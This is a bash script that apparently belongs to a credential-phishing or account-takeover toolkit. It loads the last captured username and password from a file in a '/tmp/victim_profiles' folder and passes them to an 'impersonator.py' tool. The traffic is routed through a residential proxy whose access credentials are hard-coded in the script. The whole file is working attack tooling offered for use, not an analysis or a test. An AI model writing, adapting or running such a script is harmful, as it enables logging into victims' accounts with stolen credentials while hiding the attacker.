#!/bin/bash
# Script to run impersonator.py with captured credentials

SESSION_ID="d8376699-8a30-47af-985e-1debd1be9b2b"
PROFILE_PATH="/tmp/victim_profiles/${SESSION_ID}_profile.json"

# Check if profile exists
if [ ! -f "$PROFILE_PATH" ]; then
    echo "[ERROR] Profile file not found: $PROFILE_PATH"
    exit 1
fi

# Extract credentials from profile
echo "[INFO] Extracting credentials from profile..."
USERNAME=$(python3 -c "import json, sys; data=json.load(open('$PROFILE_PATH')); creds=data.get('credentials',[]); print(creds[-1]['username'] if creds else '')" 2>/dev/null)
PASSWORD=$(python3 -c "import json, sys; data=json.load(open('$PROFILE_PATH')); creds=data.get('credentials',[]); print(creds[-1]['password'] if creds else '')" 2>/dev/null)

if [ -z "$USERNAME" ] || [ -z "$PASSWORD" ]; then
    echo "[ERROR] Could not extract credentials from profile"
    echo "[INFO] Please check the profile file manually"
    exit 1
fi

# Proxy string (DataImpulse format - auto-detect if dataimpulse.com)
PROXY_STRING="${1:-768b27aac68d92f840d9:b7564921f7b4962f@gw.dataimpulse.com:823}"

echo "[INFO] Session ID: $SESSION_ID"
echo "[INFO] Profile: $PROFILE_PATH"
echo "[INFO] Username: $USERNAME"
echo "[INFO] Password: ${PASSWORD:0:3}***"
echo "[INFO] Proxy: $PROXY_STRING"
echo ""
echo "[ACTION] Starting impersonator..."
echo ""

# Run impersonator
python3 impersonator.py \
    --profile "$PROFILE_PATH" \
    --username "$USERNAME" \
    --password "$PASSWORD" \
    --proxy "$PROXY_STRING"

